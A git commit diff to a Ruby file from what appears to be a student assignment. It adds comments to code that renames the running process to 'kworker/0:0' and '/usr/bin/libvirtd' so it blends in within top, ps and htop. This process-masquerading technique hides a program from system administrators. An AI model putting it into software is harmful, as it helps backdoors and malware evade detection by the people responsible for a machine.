37ac65672e2497eca576db0df2f2517825e22391
ThreadedLemon <slade205@gmail.com>
2014-09-24 15:46:00 -0700

    added comments mask

--- Assignment 2/mask.rb
+++ Assignment 2/mask.rb
@@ -6,6 +6,20 @@ HTOP_MASK = "/usr/bin/libvirtd"
 #Mask for when viewing processes within 'top' or 'ps'
 TOP_MASK = "kworker/0:0"
 
+=begin
+-------------------------------------------------------------------------------------------
+-- Source File: mask.rb
+--
+-- Classes: Mask
+--
+-- Date: September 24, 2014
+--
+-- Program Author: Slade Solobay & Zach Smoroden
+--
+-- Description: This is a simple program that will mask the program's process within the
+-- process table viewable using the 'htop', 'top', 'ps', etc. commands.
+-------------------------------------------------------------------------------------------
+=end
 class Mask
   inline do |builder|
     builder.include'<stdio.h>'
@@ -13,6 +27,7 @@ class Mask
     builder.include'<unistd.h>'
     builder.include'<sys/types.h>'
     builder.include'<sys/prctl.h>'
+    #C function to mask 'top'/'ps' viewable process
     builder.c'
      void mask_proc(char* exec_cmd, char* mask) {
         /* mask the process name */
@@ -31,7 +46,9 @@ class Mask
       }
     '
   end
+  #Will mask 'htop' viewable process
+  $0 =HTOP_MASK
 end
 
 Mask.new.mask_proc($PROGRAM_NAME, TOP_MASK)
-$0 =HTOP_MASK
+
